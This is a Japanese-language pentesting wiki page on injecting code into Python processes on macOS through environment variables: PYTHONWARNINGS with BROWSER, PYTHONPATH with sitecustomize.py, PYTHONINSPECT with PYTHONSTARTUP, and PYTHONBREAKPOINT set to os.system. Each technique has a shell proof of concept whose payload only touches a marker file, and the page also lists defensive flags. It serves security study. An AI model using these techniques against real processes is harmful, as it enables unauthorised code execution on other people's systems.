# macOS Python Application Injection

{{#include ../../../banners/hacktricks-training.md}}

## `PYTHONWARNINGS` と `BROWSER` 環境変数を利用する方法

攻撃者が Python プロセスの環境を制御できる場合、細工した警告オプションの処理中に Python が `antigravity` モジュールをインポートすると、`PYTHONWARNINGS` と `BROWSER` の組み合わせによってコマンド実行を引き起こせます。この手法は、`antigravity` が Python の `webbrowser` モジュールで URL を開き、そのモジュールが `BROWSER` 環境変数に従うことを利用します。<sup>[[1]](#references)</sup>

```bash
# Generate an example Python script.
echo "print('hi')" > /tmp/script.py

# Create /tmp/hacktricks through the inherited environment.
PYTHONWARNINGS="all:0:antigravity.x:0:0" BROWSER="/bin/sh -c 'touch /tmp/hacktricks' #%s" python3 /tmp/script.py

# With isolated mode, inject the warning rule using -W instead.
BROWSER="/bin/sh -c 'touch /tmp/hacktricks' #%s" python3 -I -W all:0:antigravity.x:0:0 /tmp/script.py
```

## `PYTHONPATH` と `sitecustomize.py` 経由

通常の起動時、Python の `site` モジュールはサイト固有のパスを追加し、その後 `sitecustomize` という名前のモジュールのインポートを試みます。攻撃者が読み取り可能なディレクトリを `PYTHONPATH` の先頭に置くことで、プロセス環境を制御する攻撃者は、対象スクリプトより先に Python に payload をインポートさせることができます。`-S` フラグは自動的な `site` 初期化を無効にします。一方、隔離モード（`-I`）は `PYTHONPATH` を無視し、`-s` と `-E` を暗黙に指定します。<sup>[[2]](#references)[[3]](#references)</sup>

```bash
mkdir -p /tmp/python-startup
cat >/tmp/python-startup/sitecustomize.py <<'EOF'
from pathlib import Path
Path('/tmp/python-sitecustomize-executed').touch()
EOF

PYTHONPATH=/tmp/python-startup python3 /tmp/script.py
```

書き込み可能なユーザーサイトを使った永続化については、継承された `PYTHONPATH` を使う方法ではなく、[Python の `.pth`、`.start`、`usercustomize` 起動ファイル](../../macos-auto-start-locations.md#python-startup-files-pth--usercustomize--sitecustomize)を参照してください。

## スクリプト実行後の `PYTHONINSPECT` と `PYTHONSTARTUP`

CPython 3.13 以降では、`PYTHONINSPECT=1` を設定して起動したスクリプトは、終了時に対話セッションに入ります。標準入力が端末で、PyREPL が利用可能な場合、そのセッションではプロンプトが表示される前に、`PYTHONSTARTUP` で指定されたファイルがターゲットスクリプトの**実行後**に実行されます。そのため、攻撃者が継承される両方の変数と読み取り可能な startup ファイルを制御できれば、スクリプトを変更することなく、ターゲットプロセス内でコードを実行できます。これはスクリプト実行後のトリガーであり、通常の起動フックではありません。<sup>[[3]](#references)[[5]](#references)[[6]](#references)</sup>

```bash
cat >/tmp/python-post.py <<'EOF'
from pathlib import Path
Path('/tmp/python-post-executed').touch()
EOF

# Run from a terminal using CPython 3.13+; exit the resulting prompt with Ctrl-D.
PYTHONINSPECT=1 PYTHONSTARTUP=/tmp/python-post.py python3.13 /tmp/script.py
```

この chain は、古い CPython バージョン、標準入力が端末でない場合、または `PYTHONBASICREPL` によって basic REPL が強制される場合には、startup file を実行しません。`-E` と `-I` は `PYTHON*` 変数を無視します。この経路に依存する前に、実際のインタープリターと端末の状況を確認してください。<sup>[[3]](#references)[[5]](#references)</sup>

## `PYTHONBREAKPOINT` 経由

Python 3.7（PEP 553）以降、組み込み関数 `breakpoint()` は `sys.breakpointhook` が指す対象を import して呼び出します。その対象は **`PYTHONBREAKPOINT`** 環境変数（`package.module.callable`）から取得されます。通常デバッガーが起動する前に、指定されたモジュールの import と callable の呼び出しが行われるため、`breakpoint()` に到達するプロセスの環境を攻撃者が制御できれば（メンテナンス用・デバッグ用スクリプトではよくあり、本番環境の処理経路に残されていることもあります）、コード実行が可能になります。<sup>[[4]](#references)</sup>

```bash
cat >/tmp/bp.py <<'EOF'
import sys
print("before")
breakpoint(*sys.argv[1:])
EOF

# breakpoint() invokes the chosen callable with its arguments
PYTHONBREAKPOINT="os.system" python3 /tmp/bp.py "touch /tmp/py-bp-executed"
ls -la /tmp/py-bp-executed
```

`PYTHONWARNINGS`/`PYTHONPATH`とは異なり、これは対象が実際に`breakpoint()`呼び出しに到達する必要がありますが、指定したモジュールの**import時の副作用**だけでも動作します（import可能なモジュールなら何でも指定できます。たとえば、`PYTHONPATH`の先頭に配置したモジュールで、トップレベルのコードが実行されるものなどです）。`PYTHONBREAKPOINT=0`を設定すると、フックは完全に無効になります。



## References

- [1] [環境変数を使ったHacking - elttam](https://www.elttam.com/blog/env/)
- [2] [site — サイト固有の構成フック](https://docs.python.org/3/library/site.html)
- [3] [Pythonのコマンドラインと環境](https://docs.python.org/3/using/cmdline.html)
- [4] [PEP 553 — 組み込みのbreakpoint()とPYTHONBREAKPOINT](https://peps.python.org/pep-0553/)
- [5] [CPythonインタープリターのREPLディスパッチ (`Modules/main.c`)](https://github.com/python/cpython/blob/v3.15.2/Modules/main.c)
- [6] [CPython PyREPLの起動ファイル実行 (`Lib/_pyrepl/main.py`)](https://github.com/python/cpython/blob/v3.15.2/Lib/_pyrepl/main.py)
{{#include ../../../banners/hacktricks-training.md}}
